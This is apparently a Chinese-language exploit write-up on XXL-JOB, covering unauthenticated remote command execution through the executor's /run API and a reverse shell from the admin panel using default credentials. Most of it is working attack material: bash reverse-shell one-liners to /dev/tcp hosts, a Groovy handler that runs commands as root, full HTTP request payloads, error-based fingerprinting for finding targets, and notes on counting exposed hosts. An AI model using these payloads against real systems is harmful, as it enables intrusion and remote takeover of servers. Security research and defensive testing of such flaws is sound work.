# XXL-JOB-ADMIN 反弹shell
任务管理→新增，配置如下，运行模式一定要选择GLUE(Shell)→ Cron设置成`0 0 0 * * ?` → GLUE IDE设置如下反弹代码或出网测试
```
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/x.x.x.x/1231 <&1'

或
#!/bin/bash
ping xxx.dnslog.cn
```
# xxl-job 执行器 RESTful API 未授权访问 RCE

### 利用 执行日志Console 可获取命令执行成功结果：

Example:

```/joblog/logDetailPage?id=xxxx```

#### 查看jdk环境变量
```
String var3 = System.getProperties().toString();
System.out.println(var3);
```

#### 命令执行


`/jobcode?jobId=x`

```

import com.xxl.job.core.log.XxlJobLogger;
import com.xxl.job.core.biz.model.ReturnT;
import com.xxl.job.core.handler.IJobHandler;

public class DemoGlueJobHandler extends IJobHandler {

    @Override
    public ReturnT<String> execute(String param) throws Exception {
        XxlJobLogger.log("XXL-JOB, Hello World.");
        String cmd = "whoami&&id";
        String var2 = new java.util.Scanner(new java.lang.ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next();
        System.out.println(var2);
        return var2;
    }


}
```

```
----------- JobThread Exception:org.codehaus.groovy.runtime.typehandling.GroovyCastException: Cannot cast object 'uid=0(root) gid=0(root) groups=0(root)
' with class 'java.lang.String' to class 'com.xxl.job.core.biz.model.ReturnT'
	at org.codehaus.groovy.runtime.typehandling.DefaultTypeTransformation.continueCastOnSAM(DefaultTypeTransformation.java:415)
	at org.codehaus.groovy.runtime.typehandling.DefaultTypeTransformation.continueCastOnNumber(DefaultTypeTransformation.java:329)
	at org.codehaus.groovy.runtime.typehandling.DefaultTypeTransformation.castToType(DefaultTypeTransformation.java:243)
	at org.codehaus.groovy.runtime.ScriptBytecodeAdapter.castToType(ScriptBytecodeAdapter.java:615)
	at DemoGlueJobHandler.execute(script16251277854351238137335.groovy:13)
	at com.xxl.job.core.handler.impl.GlueJobHandler.execute(GlueJobHandler.java:26)
	at com.xxl.job.core.thread.JobThread.run(JobThread.java:152)
```

`XXL-JOB <= 2.2.0`

![](./xxl-job.gif)

![](04.png)

## fofa 外网资产统计

![](./fofa.png)

![](01.png)
![](02.png)
![](03.png)
![](05.png)

## Burpsuite

```
POST /run HTTP/1.1
Host: 127.0.0.1:9999
Content-Length: 365
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "open -a Calculator",
  "glueUpdatetime": 1586629003727,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```

```
HTTP/1.1 200 OK
content-type: text/html;charset=UTF-8
content-length: 12

{"code":200}
```

## 9999 default page
```
http://127.0.0.1:9999/

HTTP/1.1 200 OK
content-type: text/html;charset=UTF-8
content-length: 61
connection: keep-alive

{
  "code": 500,
  "msg": "invalid request, HttpMethod not support."
}


POST

POST / HTTP/1.1
Host: 127.0.0.1:9999
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


HTTP/1.1 200 OK
content-type: text/html;charset=UTF-8
content-length: 63

{
  "code": 500,
  "msg": "invalid request, uri-mapping(/) not found."
}
```
## 根据异常报错指纹-快速发现目标机器

```
POST /run HTTP/1.1
Host: 127.0.0.1:9999
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```
```
HTTP/1.1 200 OK
content-type: text/html;charset=UTF-8
content-length: 646

{
  "code": 500,
  "msg": "request error:java.lang.NullPointerException
	at com.xxl.job.core.biz.impl.ExecutorBizImpl.run(ExecutorBizImpl.java:49)
	at com.xxl.job.core.server.EmbedServer$EmbedHttpServerHandler.process(EmbedServer.java:201)
	at com.xxl.job.core.server.EmbedServer$EmbedHttpServerHandler.access$200(EmbedServer.java:138)
	at com.xxl.job.core.server.EmbedServer$EmbedHttpServerHandler$1.run(EmbedServer.java:166)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at java.lang.Thread.run(Thread.java:745)
"
}
```
## other api

`src/main/java/com/xxl/job/core/server/EmbedServer.java`

```
        private Object process(HttpMethod httpMethod, String uri, String requestData, String accessTokenReq) {

            // valid
            if (HttpMethod.POST != httpMethod) {
                return new ReturnT<String>(ReturnT.FAIL_CODE, "invalid request, HttpMethod not support.");
            }
            if (uri==null || uri.trim().length()==0) {
                return new ReturnT<String>(ReturnT.FAIL_CODE, "invalid request, uri-mapping empty.");
            }
            if (accessToken!=null
                    && accessToken.trim().length()>0
                    && !accessToken.equals(accessTokenReq)) {
                return new ReturnT<String>(ReturnT.FAIL_CODE, "The access token is wrong.");
            }

            // services mapping
            try {
                if ("/beat".equals(uri)) {
                    return executorBiz.beat();
                } else if ("/idleBeat".equals(uri)) {
                    IdleBeatParam idleBeatParam = GsonTool.fromJson(requestData, IdleBeatParam.class);
                    return executorBiz.idleBeat(idleBeatParam);
                } else if ("/run".equals(uri)) {
                    TriggerParam triggerParam = GsonTool.fromJson(requestData, TriggerParam.class);
                    return executorBiz.run(triggerParam);
                } else if ("/kill".equals(uri)) {
                    KillParam killParam = GsonTool.fromJson(requestData, KillParam.class);
                    return executorBiz.kill(killParam);
                } else if ("/log".equals(uri)) {
                    LogParam logParam = GsonTool.fromJson(requestData, LogParam.class);
                    return executorBiz.log(logParam);
                } else {
                    return new ReturnT<String>(ReturnT.FAIL_CODE, "invalid request, uri-mapping("+ uri +") not found.");
                }
            } catch (Exception e) {
                logger.error(e.getMessage(), e);
                return new ReturnT<String>(ReturnT.FAIL_CODE, "request error:" + ThrowableUtil.toString(e));
            }
        }
```

## run TriggerParam.java

```
package com.xxl.job.core.biz.model;

import java.io.Serializable;

/**
 * Created by xuxueli on 16/7/22.
 */
public class TriggerParam implements Serializable{
    private static final long serialVersionUID = 42L;

    private int jobId;

    private String executorHandler;
    private String executorParams;
    private String executorBlockStrategy;
    private int executorTimeout;

    private long logId;
    private long logDateTime;

    private String glueType;
    private String glueSource;
    private long glueUpdatetime;

    private int broadcastIndex;
    private int broadcastTotal;


    public int getJobId() {
        return jobId;
    }

    public void setJobId(int jobId) {
        this.jobId = jobId;
    }

    public String getExecutorHandler() {
        return executorHandler;
    }

    public void setExecutorHandler(String executorHandler) {
        this.executorHandler = executorHandler;
    }

    public String getExecutorParams() {
        return executorParams;
    }

    public void setExecutorParams(String executorParams) {
        this.executorParams = executorParams;
    }

    public String getExecutorBlockStrategy() {
        return executorBlockStrategy;
    }

    public void setExecutorBlockStrategy(String executorBlockStrategy) {
        this.executorBlockStrategy = executorBlockStrategy;
    }

    public int getExecutorTimeout() {
        return executorTimeout;
    }

    public void setExecutorTimeout(int executorTimeout) {
        this.executorTimeout = executorTimeout;
    }

    public long getLogId() {
        return logId;
    }

    public void setLogId(long logId) {
        this.logId = logId;
    }

    public long getLogDateTime() {
        return logDateTime;
    }

    public void setLogDateTime(long logDateTime) {
        this.logDateTime = logDateTime;
    }

    public String getGlueType() {
        return glueType;
    }

    public void setGlueType(String glueType) {
        this.glueType = glueType;
    }

    public String getGlueSource() {
        return glueSource;
    }

    public void setGlueSource(String glueSource) {
        this.glueSource = glueSource;
    }

    public long getGlueUpdatetime() {
        return glueUpdatetime;
    }

    public void setGlueUpdatetime(long glueUpdatetime) {
        this.glueUpdatetime = glueUpdatetime;
    }

    public int getBroadcastIndex() {
        return broadcastIndex;
    }

    public void setBroadcastIndex(int broadcastIndex) {
        this.broadcastIndex = broadcastIndex;
    }

    public int getBroadcastTotal() {
        return broadcastTotal;
    }

    public void setBroadcastTotal(int broadcastTotal) {
        this.broadcastTotal = broadcastTotal;
    }


    @Override
    public String toString() {
        return "TriggerParam{" +
                "jobId=" + jobId +
                ", executorHandler='" + executorHandler + '\'' +
                ", executorParams='" + executorParams + '\'' +
                ", executorBlockStrategy='" + executorBlockStrategy + '\'' +
                ", executorTimeout=" + executorTimeout +
                ", logId=" + logId +
                ", logDateTime=" + logDateTime +
                ", glueType='" + glueType + '\'' +
                ", glueSource='" + glueSource + '\'' +
                ", glueUpdatetime=" + glueUpdatetime +
                ", broadcastIndex=" + broadcastIndex +
                ", broadcastTotal=" + broadcastTotal +
                '}';
    }

}

```
#### TriggerParam

```
{
  "jobId": 1,
  "executorHandler": "executorHandler",
  "executorParams": "executorParams",
  "executorBlockStrategy": "executorBlockStrategy",
  "executorTimeout": 1,
  "logId": 1,
  "logDateTime": 1,
  "glueType": "glueType",
  "glueSource": "glueSource",
  "glueUpdatetime": 1,
  "broadcastIndex": 1,
  "broadcastTotal": 1
}
```

![](./executorHandler.png)

## 历史漏洞 XXL-JOB-admin 后台反弹shell

`(需要后台账号密码，默认账号密码admin/123456)`

`/xxl-job-admin/src/test/java/com/xxl/job/admin/controller/JobInfoControllerTest.java`

```
  @Before
  public void login() throws Exception {
    MvcResult ret = mockMvc.perform(
        post("/login")
            .contentType(MediaType.APPLICATION_FORM_URLENCODED)
            .param("userName", "admin")
            .param("password", "123456")
    ).andReturn();
    cookie = ret.getResponse().getCookie(LoginService.LOGIN_IDENTITY_KEY);
  }
```

`任务调度中心-任务管理-新增`

![](./images/old/001.png)
![](./images/old/002.png)
![](./images/old/003.png)
![](./images/old/004.png)
![](./images/old/005.png)
![](./images/old/006.png)
![](./images/old/007.png)
![](./images/old/008.png)
![](./images/old/009.png)


## xxl-job executor

```
POST /xxl-job-admin/jobinfo/trigger HTTP/1.1
Host: 10.20.24.99:8080
Content-Length: 64
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.20.24.99:8080
Referer: http://10.20.24.99:8080/xxl-job-admin/jobinfo
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d
Connection: close

id=2&executorParam=&addressList=http%3A%2F%2F10.88.105.53%3A9999
```
![](./images/old/010.png)

## wireshark 抓包看看

```
╰─$ sudo tcpdump port 9999 -w 9999.pcap
tcpdump: data link type PKTAP
tcpdump: listening on pktap, link-type PKTAP (Apple DLT_PKTAP), capture size 262144 bytes
^C25 packets captured
349 packets received by filter
0 packets dropped by kernel
```


![](./run.png)

```
10.20.24.99（任务调度中心 xxl-job-admin）  > 10.88.105.53:9999 (执行器 xxl.job.executor)
User-Agent: Java/1.8.0_60


7   0.036046    10.20.24.99 10.88.105.53    HTTP    392 POST /run HTTP/1.1  (application/json)
8   0.036058    10.88.105.53    10.20.24.99 TCP 66  9999 → 50724 [ACK] Seq=1 Ack=645 Win=131456 Len=0 TSval=1636700605 TSecr=915202206
9   0.037061    10.88.105.53    10.20.24.99 HTTP    180 HTTP/1.1 200 OK  (text/html)
```


`bash -i \u003e\u0026 /dev/tcp/10.20.24.99/8989 0\u003e\u00261\n`

`bash -i >& /dev/tcp/10.20.24.99/8989 0>&1\n`

```
POST /run HTTP/1.1
Content-Type: application/json;charset=UTF-8
Accept-Charset: application/json;charset=UTF-8
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Java/1.8.0_60
Host: 10.88.105.53:9999
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
Content-Length: 326


{
  "jobId": 5,
  "executorHandler": "",
  "executorParams": "",
  "executorBlockStrategy": "SERIAL_EXECUTION",
  "executorTimeout": 0,
  "logId": 13,
  "logDateTime": 1603865778890,
  "glueType": "GLUE_SHELL",
  "glueSource": "bash -i \u003e\u0026 /dev/tcp/10.20.24.99/8989 0\u003e\u00261\n",
  "glueUpdatetime": 1603860395000,
  "broadcastIndex": 0,
  "broadcastTotal": 1
}



HTTP/1.1 200 OK
content-type: text/html;charset=UTF-8
content-length: 12
connection: keep-alive

{"code":200}
```


Ps： 此利用方式在`2019.07.08 16:20:16` 有人已经写过文章（https://www.jianshu.com/p/2d0974f33271） , 不知道为什么今天才预警？？？ 

## 参考链接

https://landgrey.me/blog/18/

https://www.xuxueli.com/xxl-job/
